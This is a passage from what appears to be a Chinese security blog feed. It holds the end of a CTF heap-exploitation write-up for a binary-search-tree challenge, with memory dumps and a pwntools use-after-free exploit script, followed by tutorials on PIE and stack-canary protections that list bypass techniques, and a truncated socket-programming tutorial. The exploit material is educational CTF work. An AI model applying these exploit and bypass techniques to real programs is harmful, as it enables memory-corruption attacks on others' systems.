class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:<span class="number">0x00000005</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:<span class="number">0xcacf5d60</span><span class="number">0x000055bc</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">3</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:<span class="number">0x00000003</span><span class="number">0x00000000</span><span class="number">0x00000028</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:<span class="number">0xcacf5ea0</span><span class="number">0x000055bc</span><span class="number">0xcacf5e20</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:<span class="number">0xcacf5de0</span><span class="number">0x000055bc</span><span class="number">0xcacf5d20</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5dd0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5de0</span>:<span class="number">0x00000004</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5df0</span>:<span class="number">0xcacf5ee0</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e00</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:<span class="number">0x00000002</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:<span class="number">0xcacf5f60</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br></pre></td></tr></table></figure><p>free后：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:<span class="number">0x00000005</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:<span class="number">0xcacf5d60</span><span class="number">0x000055bc</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:<span class="number">0x00000004</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:<span class="number">0xcacf5fe0</span><span class="number">0x000055bc</span><span class="number">0xcacf5e20</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:<span class="number">0xcacf5de0</span><span class="number">0x000055bc</span><span class="number">0xcacf5d20</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:<span class="number">0x00000002</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:<span class="number">0xcacf5f60</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>可以明显看到节点4中的右节点指针指向heap+0xde0，而这个地址并不在我们的现有节点中，查看下bins：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x55bccacf5dd0 —▸ 0x55bccacf5e90 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x55bccacf5ed0 —▸ 0x55bccacf5c10 —▸ 0x55bccacf5c90 ◂— 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到这个是一个被free后指针，所以我们可以通过构造申请从而像其中写入flag的地址，然后打印就可以了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./BST"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn","26420")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,<span class="string">'2'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'3'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">'4'</span>*<span class="number">4</span>)</span><br><span class="line">gdb.attach(p, <span class="string">'b *$rebase(0x1789)'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,p64(<span class="number">20</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x66666000</span>))</span><br><span class="line">show()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;dom
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="glibc" scheme="https://nuoye-blog.github.io/tags/glibc/"/>
    
      <category term="wp" scheme="https://nuoye-blog.github.io/tags/wp/"/>
    
      <category term="二叉树" scheme="https://nuoye-blog.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
      <category term="c++" scheme="https://nuoye-blog.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>PIE详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/22/pwn/PIE%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/22/pwn/PIE%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-22T14:22:00.000Z</published>
    <updated>2020-05-22T14:56:32.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是PIE？"><a href="#什么是PIE？" class="headerlink" title="什么是PIE？"></a>什么是PIE？</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p><h2 id="如何开启PIE"><a href="#如何开启PIE" class="headerlink" title="如何开启PIE?"></a>如何开启PIE?</h2><p>在用gcc编译时，使用如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line"></span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line"></span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><p>另外，只有在系统随机化功能开启的时候，PIE才真正的开启。否则，每次运行程序时，程序的装载地址都是固定不变的。</p><p>可以通过如下命令查看当前系统随机化功能的状态：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>其中，返回值有如下含义：</p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p>可以通过如下命令修改为全随机（具体可参考<a href="https://blog.csdn.net/counsellor/article/details/81543197）：" target="_blank" rel="noopener">https://blog.csdn.net/counsellor/article/details/81543197）：</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><h2 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h2><ol><li>直接leak出地址。</li><li>通过覆盖低位实现有范围限制的任意执行。（最低3/2个byte值为固定的，即在偏移0x000~0xfff任意处执行，必要时可以选择爆破，概率也不算太低）</li><li>直接调用vsyscall。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是PIE？&quot;&gt;&lt;a href=&quot;#什么是PIE？&quot; class=&quot;headerlink&quot; title=&quot;什么是PIE？&quot;&gt;&lt;/a&gt;什么是PIE？&lt;/h2&gt;&lt;p&gt;PIE全称是position-independent executable，中文解释为地址无关可执行
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="gcc" scheme="https://nuoye-blog.github.io/tags/gcc/"/>
    
      <category term="stack" scheme="https://nuoye-blog.github.io/tags/stack/"/>
    
      <category term="protect" scheme="https://nuoye-blog.github.io/tags/protect/"/>
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="pie" scheme="https://nuoye-blog.github.io/tags/pie/"/>
    
  </entry>
  
  <entry>
    <title>堆栈保护技术详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/22/pwn/canary%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/22/pwn/canary%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-21T17:17:00.000Z</published>
    <updated>2020-05-21T17:23:41.747Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是堆栈保护技术？"><a href="#什么是堆栈保护技术？" class="headerlink" title="什么是堆栈保护技术？"></a>什么是堆栈保护技术？</h2><p>堆栈保护技术（即Stack canary）是用于防护栈溢出攻击的一种保护机制：在栈上的返回地址跟ebp之前加上一个标志位canary，返回时通过验证这个canary是否被改写，从而判断程序是否被栈溢出攻击。</p><h2 id="如何开启堆栈保护技术？"><a href="#如何开启堆栈保护技术？" class="headerlink" title="如何开启堆栈保护技术？"></a>如何开启堆栈保护技术？</h2><p>用gcc编译时，可以用以下参数来设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-<span class="keyword">explicit</span> 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-<span class="built_in">stack</span>-protector 禁用保护</span><br></pre></td></tr></table></figure><h2 id="canary的产生"><a href="#canary的产生" class="headerlink" title="canary的产生"></a>canary的产生</h2><p>在开启了堆栈保护技术程序中，我们再ida经常可以看到用如下的指令来获取canary：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br></pre></td></tr></table></figure><p>其中，fs其实是指向当前栈的TLS结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>fs+0x28h即为stack_guard。</p><p>而TLS结构是由security_init()初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p>security_init()是ld文件中的一个子函数，在ida中可以看到，初始化canary为如下指令（以2.23版本为例）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000003C25                 mov     rdx, cs:qword_225E68</span><br><span class="line">.text:0000000000003C2C                 mov     rax, [rdx]</span><br><span class="line">.text:0000000000003C2F                 xor     al, al</span><br><span class="line">.text:0000000000003C31                 mov     fs:28h, rax</span><br><span class="line">.text:0000000000003C3A                 mov     rax, [rdx+8]</span><br><span class="line">.text:0000000000003C3E                 mov     fs:30h, rax</span><br><span class="line">.text:0000000000003C47                 mov     cs:qword_225E68, 0</span><br><span class="line">.text:0000000000003C52                 mov     cs:qword_225C70, rax</span><br></pre></td></tr></table></figure><p>其中，cs:qword_225E68即对应对应于存放_dl_random的地址。</p><p>（注：fs寄存器的内容可以通过在gdb中直接输入fsbase得到。）</p><p>而_dl_random的地址来自：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000019741                 cmp     [rsp+78h+var_49], 0</span><br><span class="line">.text:0000000000019746                 jz      loc_1983C</span><br><span class="line">.text:000000000001974C                 mov     rax, [rsp+20h]</span><br><span class="line">.text:0000000000019751                 mov     cs:qword_225E68, rax</span><br></pre></td></tr></table></figure><p>这里下个内存断点来跟进（直接关闭aslr）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; watch *(0x7fffffffde80+0x20)</span><br><span class="line">Hardware watchpoint 5: *(0x7fffffffde80+0x20)</span><br></pre></td></tr></table></figure><p>结果跟进到 <code>► 0x7ffff7df0786 &lt;_dl_sysdep_start+518&gt;    jmp    _dl_sysdep_start+304 &lt;0x7ffff7df06b0&gt;</code>里面来，在ida下看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000019778 loc_19778:</span><br><span class="line">.text:0000000000019778                 mov     rax, [rdx+8] </span><br><span class="line">.text:000000000001977C                 mov     [rsp+78h+var_49], 1</span><br><span class="line">.text:0000000000019781                 mov     [rsp+20h], rax</span><br><span class="line">.text:0000000000019786                 jmp     loc_196B0</span><br></pre></td></tr></table></figure><p>可以看到rsp+0x20的值来自[rdx+8]。分析整个函数，可以得知rdx的值是来自于<code>_dl_sysdep_start</code>函数的第一个参数（有一定的偏移，其值为0x7fffffffdf70，而<code>_dl_random</code>的值为0x7fffffffe2c9）。</p><p>继续追溯可以找到也是_dl_start来自的第一个参数（同样是0x7fffffffdf70）。</p><p>最终追溯到ld中start函数的rsp：0x7fffffffdf70。</p><h2 id="绕过堆栈保护方法"><a href="#绕过堆栈保护方法" class="headerlink" title="绕过堆栈保护方法"></a>绕过堆栈保护方法</h2><p>canary绕过方式总结下有这几种：</p><ol><li>直接通过相邻的变量puts或者printf，然后leak出来</li><li>逐位爆破</li><li>通过覆盖TLS结构（地址可以通过与libc的偏移计算得出）中的canary，从而绕过canary保护</li><li>劫持___stack_chk_fail的got表项</li><li>劫持栈上<code>*** stack smashing detected ***: ./canary terminated</code>中对应<code>./canary</code>处的指针，在发生smashing detected时泄漏出关键信息</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是堆栈保护技术？&quot;&gt;&lt;a href=&quot;#什么是堆栈保护技术？&quot; class=&quot;headerlink&quot; title=&quot;什么是堆栈保护技术？&quot;&gt;&lt;/a&gt;什么是堆栈保护技术？&lt;/h2&gt;&lt;p&gt;堆栈保护技术（即Stack canary）是用于防护栈溢出攻击的一种保护机制
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="gcc" scheme="https://nuoye-blog.github.io/tags/gcc/"/>
    
      <category term="canary" scheme="https://nuoye-blog.github.io/tags/canary/"/>
    
      <category term="stack" scheme="https://nuoye-blog.github.io/tags/stack/"/>
    
      <category term="protect" scheme="https://nuoye-blog.github.io/tags/protect/"/>
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>socket编程详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-20T14:26:00.000Z</published>
    <updated>2020-05-20T14:26:10.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>网络进程标识：ip地址，协议，端口。</p><p>TCP/IP是传输控制协议/网间协议。</p><p>TCP/IP协议存在于OS中，网络服务通过OS提供，在OS中增加支持TCP/IP的系统调用。</p><p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。</p><h2 id="Socket-API"><a href="#Socket-API" class="headerlink" title="Socket API"></a>Socket API</h2><h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> protofamily, <span class="keyword">int</span> typ, <span class="keyword">int</span> protocol)</span></span>; <span class="comment">//返回sockfd</span></span><br></pre></td></tr></table></figure><p>该函数用于创建一个socket描述符，它唯一标识一个socket。其中三个参数分别如下：</p><ul><li>protofamily：即协议域，又称为协议族（family）。常用的协议族有，AF_INET(IPV4)、AF_INET6(IPV6)、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。当其为0时，会自动选择type对应的默认协议。</li><li>type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等。</li><li>protocol：顾名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议。</li></ul><p>注：protofamily与type不可随意组合。</p><h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind()函数"></a>bind()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用来把一个特定地址赋给sockfd，如127.0.0.1:80。若未用该函数直接connect()，list()时系统会随机分配一个端口号。</p><p>函数的三个参数分别为：</p><ul><li><p>sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。</p></li><li><p>addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ipv6对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span> </span><br><span class="line">    <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span 